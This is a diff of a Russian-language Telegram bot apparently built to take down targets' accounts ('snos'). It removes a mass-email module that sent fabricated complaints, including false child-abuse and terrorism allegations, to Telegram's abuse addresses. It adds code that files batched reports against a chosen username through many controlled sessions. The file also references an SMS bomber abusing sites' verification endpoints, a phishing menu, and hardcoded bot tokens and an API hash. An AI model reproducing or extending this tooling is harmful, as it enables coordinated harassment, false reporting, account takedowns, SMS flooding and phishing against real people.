@@ -9,11 +9,6 @@ import time
 import shutil
 import re
 import hashlib
-import smtplib
-import concurrent.futures
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-from email.header import Header
 from datetime import datetime
 from typing import Optional, Dict, List, Tuple
 
@@ -30,10 +25,11 @@ from aiogram.enums import ParseMode
 from pyrogram import Client
 from pyrogram.errors import FloodWait, RPCError
 import pyrogram.raw.functions.messages as raw_messages
+import pyrogram.raw.functions.account as raw_account
 import pyrogram.raw.types as raw_types
 
 # ---------- НАСТРОЙКИ ----------
-BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
+BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
@@ -49,7 +45,6 @@ MAX_ROUNDS = 10
 BOMBER_DELAY = 2
 SITE_DELAY = 10
 
-MAIL_CONFIG_FILE = "mail_config.json"
 BANNER_PATH = "banner.png"
 
 USER_AGENTS = [
@@ -64,29 +59,6 @@ USER_AGENTS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
 ]
-
-RECEIVERS = [
-    'abuse@telegram.org',
-    'dmca@telegram.org',
-    'security@telegram.org',
-    'support@telegram.org',
-    'sms@telegram.org',
-    'stopca@telegram.org',
-    'ca@telegram.org',
-    'legal@telegram.org',
-    'privacy@telegram.org',
-    'copyright@telegram.org',
-]
-
-SMTP_SERVERS = {
-    'mail.ru': {'server': 'smtp.mail.ru', 'port': 587},
-    'yandex.ru': {'server': 'smtp.yandex.ru', 'port': 587},
-    'gmail.com': {'server': 'smtp.gmail.com', 'port': 587},
-    'rambler.ru': {'server': 'smtp.rambler.ru', 'port': 587},
-    'bk.ru': {'server': 'smtp.mail.ru', 'port': 587},
-    'inbox.ru': {'server': 'smtp.mail.ru', 'port': 587},
-    'list.ru': {'server': 'smtp.mail.ru', 'port': 587},
-}
 
 DEVICES = [
     {"model": f"iPhone {m}", "system": f"iOS {i}"}
@@ -129,23 +101,40 @@ BOMBER_WEBSITES = [
     {"url": "https://api.wildberries.ru/webapi/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
 ]
 
-COMPLAINT_TEXTS_ACCOUNT = {
-    "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
-    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт.",
-    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет. Прошу разберитесь с этим.",
-    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться!",
-    "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
+SNOS_REPORT_REASONS = {
+    "spam": raw_types.InputReportReasonSpam(),
+    "violence": raw_types.InputReportReasonViolence(),
+    "pornography": raw_types.InputReportReasonPornography(),
+    "child_abuse": raw_types.InputReportReasonChildAbuse(),
+    "copyright": raw_types.InputReportReasonCopyright(),
+    "other": raw_types.InputReportReasonOther(),
+    "personal_data": raw_types.InputReportReasonPersonalDetails(),
+    "illegal_drugs": raw_types.InputReportReasonIllegalDrugs(),
+    "fake": raw_types.InputReportReasonFake(),
 }
 
-COMPLAINT_TEXTS_CHANNEL = {
-    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал.",
-    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка: {channel_link} Нарушение: {violation_link} Просьба заблокировать данный канал.",
-    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов: {violation_link}.",
-    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними. Ссылка на канал - {channel_link}. Нарушение - {violation_link}. Просьба удалить данный канал.",
-    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка: {channel_link}. Нарушение: {violation_link}. Просьба удалить канал.",
-    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}.",
-    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка: {channel_link}, нарушение: {violation_link}. Просьба удалить канал.",
-    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Нарушение - {violation_link}."
+SNOS_REPORT_REASONS_RU = {
+    "spam": "Спам",
+    "violence": "Насилие",
+    "pornography": "Порнография",
+    "child_abuse": "Детское насилие",
+    "copyright": "Авторские права",
+    "other": "Другое",
+    "personal_data": "Личные данные",
+    "illegal_drugs": "Наркотики",
+    "fake": "Фейковый аккаунт",
+}
+
+SNOS_REPORT_MESSAGES = {
+    "spam": "Этот аккаунт рассылает спам-сообщения и рекламу. Прошу проверить и заблокировать.",
+    "violence": "Аккаунт публикует контент с насилием и жестокостью. Нарушает правила Telegram.",
+    "pornography": "Аккаунт распространяет порнографический контент без согласия участников.",
+    "child_abuse": "Аккаунт связан с распространением детской порнографии. Требуется немедленная блокировка.",
+    "copyright": "Аккаунт нарушает авторские права, публикуя защищенный контент без разрешения.",
+    "other": "Аккаунт систематически нарушает правила Telegram и мешает другим пользователям.",
+    "personal_data": "Аккаунт публикует личные данные людей без их согласия (доксинг).",
+    "illegal_drugs": "Аккаунт используется для продажи и распространения наркотических веществ.",
+    "fake": "Это фейковый аккаунт, выдающий себя за другого человека. Нарушение правил платформы.",
 }
 
 REPORT_REASONS = {
@@ -258,6 +247,7 @@ user_sessions = {}
 active_attacks = {}
 active_bombers = {}
 active_reports = {}
+active_snos_account = {}
 sessions_creation_lock = {}
 usage_logs = []
 MAX_LOGS = 20
@@ -277,17 +267,6 @@ class ReportMessageState(StatesGroup):
     waiting_link = State()
     waiting_reason = State()
 
-class MailAccountState(StatesGroup):
-    waiting_choice = State()
-    waiting_username = State()
-    waiting_id = State()
-    waiting_reason = State()
-
-class MailChannelState(StatesGroup):
-    waiting_choice = State()
-    waiting_channel = State()
-    waiting_violation = State()
-
 class PhishState(StatesGroup):
     waiting_title = State()
     waiting_description = State()
@@ -295,6 +274,10 @@ class PhishState(StatesGroup):
 
 class AdminState(StatesGroup):
     waiting_user_id = State()
+
+class SnosAccountState(StatesGroup):
+    waiting_username = State()
+    waiting_reason = State()
 
 
 def check_cooldown(user_id: int, action: str) -> tuple:
@@ -367,85 +350,6 @@ class AccessMiddleware:
         return await handler(event, data)
 
 dp.update.middleware(AccessMiddleware())
-
-
-# ---------- EMAIL SENDER ----------
-class EmailSender:
-    def __init__(self):
-        self.senders = {}
-        self.load_config()
-    
-    def load_config(self):
-        try:
-            with open(MAIL_CONFIG_FILE, 'r', encoding='utf-8') as f:
-                self.senders = json.load(f)
-        except:
-            self.senders = {}
-            self.save_config()
-    
-    def save_config(self):
-        with open(MAIL_CONFIG_FILE, 'w', encoding='utf-8') as f:
-            json.dump(self.senders, f, indent=4, ensure_ascii=False)
-    
-    def get_smtp_server(self, email: str) -> Tuple[str, int]:
-        domain = email.split('@')[1].lower()
-        if domain in SMTP_SERVERS:
-            return SMTP_SERVERS[domain]['server'], SMTP_SERVERS[domain]['port']
-        return 'smtp.mail.ru', 587
-    
-    def send_email(self, receiver: str, sender_email: str, sender_password: str, 
-                   subject: str, body: str) -> bool:
-        try:
-            msg = MIMEMultipart()
-            msg['From'] = sender_email
-            msg['To'] = receiver
-            msg['Subject'] = Header(subject, 'utf-8')
-            msg.attach(MIMEText(body, 'plain', 'utf-8'))
-            
-            server_addr, port = self.get_smtp_server(sender_email)
-            
-            server = smtplib.SMTP(server_addr, port, timeout=30)
-            server.starttls()
-            server.login(sender_email, sender_password)
-            server.sendmail(sender_email, receiver, msg.as_string())
-            server.quit()
-            
-            return True
-        except Exception as e:
-            logger.error(f"Send error from {sender_email} to {receiver}: {e}")
-            return False
-    
-    def send_mass(self, receivers: List[str], subject: str, body: str) -> int:
-        sent_count = 0
-        
-        with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
-            futures = []
-            
-            for sender_email, sender_password in self.senders.items():
-                for receiver in receivers:
-                    future = executor.submit(
-                        self.send_email, 
-                        receiver, 
-                        sender_email, 
-                        sender_password, 
-                        subject, 
-                        body
-                    )
-                    futures.append((future, sender_email, receiver))
-                    time.sleep(2)
-            
-            for future, sender_email, receiver in futures:
-                try:
-                    if future.result():
-                        sent_count += 1
-                        logger.info(f"Sent: {sender_email} -> {receiver}")
-                except Exception as e:
-                    logger.error(f"Error: {sender_email} -> {receiver}: {e}")
-        
-        return sent_count
-
-
-email_sender = EmailSender()
 
 
 # ---------- СЕССИИ ----------
@@ -559,6 +463,110 @@ def get_user_sessions_count(user_id: int) -> int:
 
 def is_user_sessions_ready(user_id: int) -> bool:
     return user_id in user_sessions and user_sessions[user_id].get("ready", False)
+
+
+# ---------- СНОС АККАУНТА ЧЕРЕЗ СЕССИИ ----------
+async def report_account_via_session(session_data: dict, username: str, reason_key: str) -> dict:
+    try:
+        client = session_data["client"]
+        if not client.is_connected:
+            await client.connect()
+        
+        try:
+            user = await client.get_users(username)
+        except Exception as e:
+            logger.error(f"Failed to get user {username}: {e}")
+            return {"success": False, "error": "User not found"}
+        
+        peer = await client.resolve_peer(user.id)
+        report_reason = SNOS_REPORT_REASONS.get(reason_key, raw_types.InputReportReasonOther())
+        report_message = SNOS_REPORT_MESSAGES.get(reason_key, "Нарушение правил Telegram")
+        
+        await client.invoke(
+            raw_messages.Report(
+                peer=peer,
+                id=[raw_types.InputMessagePinned()],
+                reason=report_reason,
+                message=report_message
+            )
+        )
+        
+        try:
+            await client.invoke(
+                raw_account.ReportPeer(
+                    peer=peer,
+                    reason=report_reason,
+                    message=report_message
+                )
+            )
+        except:
+            pass
+        
+        logger.info(f"Session {session_data['index']} reported @{username} with reason {reason_key}")
+        return {"success": True}
+        
+    except FloodWait as e:
+        session_data["flood_until"] = time.time() + e.value
+        logger.warning(f"Flood wait for {e.value}s on session {session_data.get('index', 'unknown')}")
+        return {"success": False, "flood": True, "wait": e.value}
+    except Exception as e:
+        logger.error(f"Report error on session {session_data.get('index', 'unknown')}: {e}")
+        return {"success": False, "error": str(e)}
+
+
+async def snos_account_attack(user_id: int, username: str, reason_key: str, progress_callback=None) -> tuple:
+    username = username.strip().replace("@", "")
+    add_log(user_id, f"Снос аккаунта ({SNOS_REPORT_REASONS_RU.get(reason_key, reason_key)})", f"@{username}")
+    
+    if not is_user_sessions_ready(user_id):
+        return 0, 0, 0, "Сессии не готовы"
+    
+    sessions = await get_user_sessions_batch(user_id, SESSIONS_PER_USER)
+    if not sessions:
+        return 0, 0, 0, "Нет доступных сессий"
+    
+    total_sessions = len(sessions)
+    success_count = 0
+    flood_count = 0
+    error_count = 0
+    
+    logger.info(f"Starting account snos for @{username} with {total_sessions} sessions, reason: {reason_key}")
+    
+    batch_size = 10
+    for i in range(0, len(sessions), batch_size):
+        batch = sessions[i:i+batch_size]
+        
+        tasks = [report_account_via_session(s, username, reason_key) for s in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if isinstance(result, dict):
+                if result.get("success"):
+                    success_count += 1
+                elif result.get("flood"):
+                    flood_count += 1
+                else:
+                    error_count += 1
+            else:
+                error_count += 1
+        
+        if progress_callback:
+            await progress_callback(
+                min(i + batch_size, total_sessions), 
+                total_sessions,
+                success_count,
+                flood_count,
+                error_count
+            )
+        
+        if i + batch_size < len(sessions):
+            await asyncio.sleep(2)
+    
+    release_user_sessions(sessions)
+    
+    logger.info(f"Account snos completed for @{username}: {success_count} success, {flood_count} flood, {error_count} errors")
+    
+    return success_count, flood_count, error_count, None
 
 
 # ---------- СНОС НОМЕРА ----------
@@ -788,7 +796,7 @@ def get_main_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="СНОС НОМЕРА", callback_data="snos_menu")
     builder.button(text="БОМБЕР", callback_data="bomber_menu")
-    builder.button(text="СНОС ПОЧТА", callback_data="mail_menu")
+    builder.button(text="СНОС АККАУНТА", callback_data="snos_account_menu")
     builder.button(text="ЖАЛОБА НА СООБЩЕНИЕ", callback_data="report_menu")
     builder.button(text="ФИШИНГ", callback_data="phish_menu")
     builder.button(text="АДМИН", callback_data="admin_menu")
@@ -805,35 +813,27 @@ def get_snos_menu():
     builder.adjust(1, 1, 1)
     return builder.as_markup()
 
+def get_snos_account_menu():
+    builder = InlineKeyboardBuilder()
+    builder.button(text="ЗАПУСТИТЬ СНОС АККАУНТА", callback_data="snos_account_start")
+    builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
+    builder.button(text="НАЗАД", callback_data="main_menu")
+    builder.adjust(1, 1, 1)
+    return builder.as_markup()
+
+def get_snos_account_reason_menu():
+    builder = InlineKeyboardBuilder()
+    for k, v in SNOS_REPORT_REASONS_RU.items():
+        builder.button(text=v, callback_data=f"snosreason_{k}")
+    builder.button(text="НАЗАД", callback_data="snos_account_menu")
+    builder.adjust(2)
+    return builder.as_markup()
+
 def get_bomber_menu():
     builder = InlineKeyboardBuilder()
     builder.button(text="ЗАПУСТИТЬ БОМБЕР", callback_data="bomber")
     builder.button(text="НАЗАД", callback_data="main_menu")
     builder.adjust(1, 1)
-    return builder.as_markup()
-
-def get_mail_menu():
-    builder = InlineKeyboardBuilder()
-    builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="mail_acc")
-    builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="mail_chan")
-    builder.button(text="НАЗАД", callback_data="main_menu")
-    builder.adjust(1, 1, 1)
-    return builder.as_markup()
-
-def get_mail_account_menu():
-    builder = InlineKeyboardBuilder()
-    for i in ["1.1", "1.2", "1.3", "1.4", "1.5"]:
-        builder.button(text=f"{i} Жалоба", callback_data=f"mailacc_{i}")
-    builder.button(text="НАЗАД", callback_data="mail_menu")
-    builder.adjust(1)
-    return builder.as_markup()
-
-def get_mail_channel_menu():
-    builder = InlineKeyboardBuilder()
-    for i in ["8", "9", "10", "11", "12", "13", "14", "15"]:
-        builder.button(text=f"{i} Жалоба", callback_data=f"mailchan_{i}")
-    builder.button(text="НАЗАД", callback_data="mail_menu")
-    builder.adjust(1)
     return builder.as_markup()
 
 def get_report_menu():
@@ -938,19 +938,124 @@ async def snos_menu(cb: types.CallbackQuery):
     await edit_message_with_banner(cb, f"<b>СНОС НОМЕРА</b>\n\n100 запросов/круг\nМакс. 10 кругов", get_snos_menu())
     await cb.answer()
 
+@dp.callback_query(F.data == "snos_account_menu")
+async def snos_account_menu(cb: types.CallbackQuery):
+    await edit_message_with_banner(
+        cb, 
+        f"<b>СНОС АККАУНТА</b>\n\nМассовая отправка жалоб через сессии\nСессий: {get_user_sessions_count(cb.from_user.id)}/{SESSIONS_PER_USER}", 
+        get_snos_account_menu()
+    )
+    await cb.answer()
+
+@dp.callback_query(F.data == "snos_account_start")
+async def snos_account_start(cb: types.CallbackQuery, state: FSMContext):
+    if not await check_channel_subscription(cb.from_user.id):
+        await cb.answer("Подпишитесь на канал!", show_alert=True)
+        return
+    
+    can, wait = check_cooldown(cb.from_user.id, "snos_account")
+    if not can:
+        await cb.answer(f"Подождите {int(wait)} сек.", show_alert=True)
+        return
+    
+    if not is_user_sessions_ready(cb.from_user.id):
+        await cb.answer("Сессии загружаются...", show_alert=True)
+        return
+    
+    if cb.from_user.id in active_snos_account:
+        await cb.answer("Снос аккаунта уже запущен!", show_alert=True)
+        return
+    
+    await state.set_state(SnosAccountState.waiting_username)
+    await cb.message.delete()
+    await cb.message.answer_photo(
+        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
+        caption="<b>СНОС АККАУНТА</b>\n\nВведите юзернейм (без @):\n<code>username</code>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="snos_account_menu")]])
+    )
+
+@dp.message(StateFilter(SnosAccountState.waiting_username))
+async def snos_account_username(msg: types.Message, state: FSMContext):
+    username = msg.text.strip().replace("@", "")
+    if not re.match(r'^[a-zA-Z][a-zA-Z0-9_]{3,31}$', username):
+        await send_message_with_banner(msg, "Неверный формат юзернейма!")
+        return
+    
+    await state.update_data(username=username)
+    await state.set_state(SnosAccountState.waiting_reason)
+    await msg.delete()
+    await msg.answer_photo(
+        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
+        caption=f"<b>Юзернейм: @{username}</b>\n\nВыберите причину жалобы:",
+        reply_markup=get_snos_account_reason_menu()
+    )
+
+@dp.callback_query(F.data.startswith("snosreason_"))
+async def snos_account_reason(cb: types.CallbackQuery, state: FSMContext):
+    reason_key = cb.data.replace("snosreason_", "")
+    data = await state.get_data()
+    username = data["username"]
+    user_id = cb.from_user.id
+    
+    await state.clear()
+    await cb.message.delete()
+    
+    stop_event = asyncio.Event()
+    active_snos_account[user_id] = {"stop_event": stop_event}
+    
+    reason_ru = SNOS_REPORT_REASONS_RU.get(reason_key, reason_key)
+    st = await cb.message.answer_photo(
+        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
+        caption=f"<b>СНОС АККАУНТА ЗАПУЩЕН</b>\n\nЮзернейм: @{username}\nПричина: {reason_ru}\n\nОтправка жалоб..."
+    )
+    
+    async def progress_callback(current, total, success, flood, errors):
+        try:
+            await st.edit_caption(
+                caption=f"<b>СНОС АККАУНТА</b>\n\n"
+                f"Юзернейм: @{username}\n"
+                f"Причина: {reason_ru}\n"
+                f"Прогресс: {current}/{total}\n"
+                f"Успешно: {success}\n"
+                f"Флуд: {flood}\n"
+                f"Ошибок: {errors}"
+            )
+        except:
+            pass
+    
+    success, flood, errors, err_msg = await snos_account_attack(user_id, username, reason_key, progress_callback)
+    
+    await st.delete()
+    if user_id in active_snos_account:
+        del active_snos_account[user_id]
+    
+    total = success + flood + errors
+    result_text = (
+        f"<b>СНОС АККАУНТА ЗАВЕРШЕН</b>\n\n"
+        f"Юзернейм: @{username}\n"
+        f"Причина: {reason_ru}\n\n"
+        f"Всего сессий: {total}\n"
+        f"Успешно: {success}\n"
+        f"Флуд: {flood}\n"
+        f"Ошибок: {errors}"
+    )
+    if err_msg:
+        result_text += f"\n\n{err_msg}"
+    
+    await cb.message.answer_photo(
+        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
+        caption=result_text,
+        reply_markup=get_main_menu()
+    )
+
 @dp.callback_query(F.data == "bomber_menu")
 async def bomber_menu(cb: types.CallbackQuery):
     await edit_message_with_banner(cb, f"<b>БОМБЕР</b>\n\nСайтов: {len(BOMBER_WEBSITES)}", get_bomber_menu())
     await cb.answer()
 
-@dp.callback_query(F.data == "mail_menu")
-async def mail_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, f"<b>СНОС ПОЧТА</b>\n\nОтправителей: {len(email_sender.senders)}", get_mail_menu())
-    await cb.answer()
-
 @dp.callback_query(F.data == "report_menu")
 async def report_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, f"<b>ЖАЛОБЫ</b>", get_report_menu())
+    await edit_message_with_banner(cb, f"<b>ЖАЛОБЫ НА СООБЩЕНИЯ</b>", get_report_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "phish_menu")
@@ -983,7 +1088,7 @@ async def admin_add(cb: types.CallbackQuery, state: FSMContext):
     await cb.message.delete()
     await cb.message.answer_photo(
         FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>ВЫДАТЬ ДОСТУП</b>\n\nВведите ID:",
+        caption="<b>ВЫДАТЬ ДОСТУП</b>\n\nВведите ID пользователя:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]])
     )
 
@@ -1021,7 +1126,7 @@ async def admin_remove_process(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(cb: types.CallbackQuery):
-    text = "<b>РАЗРЕШЕННЫЕ</b>\n\n" + "\n".join(f"<code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Пусто"
+    text = "<b>РАЗРЕШЕННЫЕ ПОЛЬЗОВАТЕЛИ</b>\n\n" + "\n".join(f"<code>{uid}</code>" for uid in ALLOWED_USERS) if ALLOWED_USERS else "Пусто"
     await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))
 
 @dp.callback_query(F.data == "main_menu")
@@ -1031,10 +1136,10 @@ async def main_menu(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.callback_query(F.data == "refresh_sessions")
 async def refresh_sessions(cb: types.CallbackQuery):
-    if cb.from_user.id in active_attacks:
-        await cb.answer("Нельзя во время сноса!", show_alert=True)
+    if cb.from_user.id in active_attacks or cb.from_user.id in active_snos_account:
+        await cb.answer("Нельзя во время атаки!", show_alert=True)
         return
-    await cb.answer("Обновление...")
+    await cb.answer("Обновление сессий...")
     asyncio.create_task(refresh_user_sessions(cb.from_user.id))
 
 @dp.callback_query(F.data == "status")
@@ -1079,7 +1184,7 @@ async def snos_phone(msg: types.Message, state: FSMContext):
     if not phone.startswith("+"):
         phone = "+" + phone
     if not re.match(r'^\+\d{10,15}$', phone):
-        await send_message_with_banner(msg, "Неверный формат!")
+        await send_message_with_banner(msg, "Неверный формат номера!")
         return
     await state.update_data(phone=phone)
     await state.set_state(SnosState.waiting_count)
@@ -1111,7 +1216,7 @@ async def snos_count(msg: types.Message, state: FSMContext):
     
     async def progress_callback(cur, tot, ok_count):
         try:
-            await st.edit_caption(caption=f"<b>СНОС</b>\n\n{phone}\nКруг: {cur}/{tot}\nЗапросов: {ok_count}")
+            await st.edit_caption(caption=f"<b>СНОС НОМЕРА</b>\n\n{phone}\nКруг: {cur}/{tot}\nЗапросов: {ok_count}")
         except:
             pass
     
@@ -1208,7 +1313,7 @@ async def report_msg_start(cb: types.CallbackQuery, state: FSMContext):
     await cb.message.delete()
     await cb.message.answer_photo(
         FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>ЖАЛОБА</b>\n\nВведите ссылку:\n<code>https://t.me/username/123</code>",
+        caption="<b>ЖАЛОБА НА СООБЩЕНИЕ</b>\n\nВведите ссылку:\n<code>https://t.me/username/123</code>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="report_menu")]])
     )
 
@@ -1240,12 +1345,12 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
     active_reports[user_id] = True
     st = await cb.message.answer_photo(
         FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>ОТПРАВКА...</b>"
+        caption="<b>ОТПРАВКА ЖАЛОБ...</b>"
     )
     
     async def progress_callback(current):
         try:
-            await st.edit_caption(caption=f"<b>ОТПРАВКА</b>\n\n{current}")
+            await st.edit_caption(caption=f"<b>ОТПРАВКА</b>\n\nОтправлено: {current}")
         except:
             pass
     
@@ -1260,146 +1365,6 @@ async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
         FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
         caption="<b>VICTIM SNOS</b>", 
         reply_markup=get_main_menu()
-    )
-
-@dp.callback_query(F.data == "mail_acc")
-async def mail_acc_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "<b>ЖАЛОБА НА АККАУНТ</b>", get_mail_account_menu())
-    await cb.answer()
-
-@dp.callback_query(F.data.startswith("mailacc_"))
-async def mail_acc_type(cb: types.CallbackQuery, state: FSMContext):
-    complaint_type = cb.data.replace("mailacc_", "")
-    await state.update_data(complaint_type=complaint_type)
-    await state.set_state(MailAccountState.waiting_username)
-    await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>Введите юзернейм (без @):</b>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_acc")]])
-    )
-
-@dp.message(StateFilter(MailAccountState.waiting_username))
-async def mail_acc_username(msg: types.Message, state: FSMContext):
-    username = msg.text.strip().replace("@", "")
-    await state.update_data(username=username)
-    await state.set_state(MailAccountState.waiting_id)
-    await msg.delete()
-    await send_message_with_banner(msg, "Введите Telegram ID:")
-
-@dp.message(StateFilter(MailAccountState.waiting_id))
-async def mail_acc_id(msg: types.Message, state: FSMContext):
-    data = await state.get_data()
-    username = data.get("username", "")
-    telegram_id = msg.text.strip()
-    complaint_type = data.get("complaint_type", "1.2")
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    reason_map = {
-        "1.1": "нарушение правил",
-        "1.2": "взлом аккаунта",
-        "1.3": "использование виртуального номера",
-        "1.4": "рассылка спама",
-        "1.5": "спам-рассылка с премиум"
-    }
-    reason_text = reason_map.get(complaint_type, "нарушение")
-    
-    body = COMPLAINT_TEXTS_ACCOUNT[complaint_type].format(
-        username=username, 
-        telegram_id=telegram_id, 
-        reason=reason_text
-    )
-    subject = f"Жалоба на аккаунт @{username} | Telegram"
-    
-    if not email_sender.senders:
-        await send_message_with_banner(msg, "<b>ОШИБКА</b>\n\nНет отправителей! Добавьте почты в mail_config.json", get_main_menu())
-        return
-    
-    st = await send_message_with_banner(msg, "<b>Отправка жалоб...</b>\n\nПожалуйста, подождите...")
-    
-    loop = asyncio.get_event_loop()
-    sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
-    
-    await st.delete()
-    
-    add_log(user_id, "Снос почта (аккаунт)", f"@{username} - {sent} писем")
-    
-    await send_message_with_banner(
-        msg,
-        f"<b>ЖАЛОБЫ ОТПРАВЛЕНЫ!</b>\n\n"
-        f"Аккаунт: @{username}\n"
-        f"ID: <code>{telegram_id}</code>\n"
-        f"Тип: {complaint_type}\n"
-        f"Отправлено: <b>{sent}</b> писем",
-        get_main_menu()
-    )
-
-@dp.callback_query(F.data == "mail_chan")
-async def mail_chan_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, "<b>ЖАЛОБА НА КАНАЛ</b>", get_mail_channel_menu())
-    await cb.answer()
-
-@dp.callback_query(F.data.startswith("mailchan_"))
-async def mail_chan_type(cb: types.CallbackQuery, state: FSMContext):
-    complaint_type = cb.data.replace("mailchan_", "")
-    await state.update_data(complaint_type=complaint_type)
-    await state.set_state(MailChannelState.waiting_channel)
-    await cb.message.delete()
-    await cb.message.answer_photo(
-        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
-        caption="<b>Введите ссылку на канал:</b>",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="mail_chan")]])
-    )
-
-@dp.message(StateFilter(MailChannelState.waiting_channel))
-async def mail_chan_link(msg: types.Message, state: FSMContext):
-    channel = msg.text.strip()
-    await state.update_data(channel=channel)
-    await state.set_state(MailChannelState.waiting_violation)
-    await msg.delete()
-    await send_message_with_banner(msg, "Введите ссылку на нарушение:")
-
-@dp.message(StateFilter(MailChannelState.waiting_violation))
-async def mail_chan_violation(msg: types.Message, state: FSMContext):
-    data = await state.get_data()
-    channel = data.get("channel", "")
-    violation = msg.text.strip()
-    complaint_type = data.get("complaint_type", "8")
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    body = COMPLAINT_TEXTS_CHANNEL[complaint_type].format(
-        channel_link=channel, 
-        violation_link=violation
-    )
-    subject = f"Жалоба на канал Telegram | Нарушение правил"
-    
-    if not email_sender.senders:
-        await send_message_with_banner(msg, "<b>ОШИБКА</b>\n\nНет отправителей! Добавьте почты в mail_config.json", get_main_menu())
-        return
-    
-    st = await send_message_with_banner(msg, "<b>Отправка жалоб...</b>\n\nПожалуйста, подождите...")
-    
-    loop = asyncio.get_event_loop()
-    sent = await loop.run_in_executor(None, email_sender.send_mass, RECEIVERS, subject, body)
-    
-    await st.delete()
-    
-    add_log(user_id, "Снос почта (канал)", f"{channel} - {sent} писем")
-    
-    await send_message_with_banner(
-        msg,
-        f"<b>ЖАЛОБЫ ОТПРАВЛЕНЫ!</b>\n\n"
-        f"Канал: {channel}\n"
-        f"Нарушение: {violation}\n"
-        f"Тип жалобы: {complaint_type}\n"
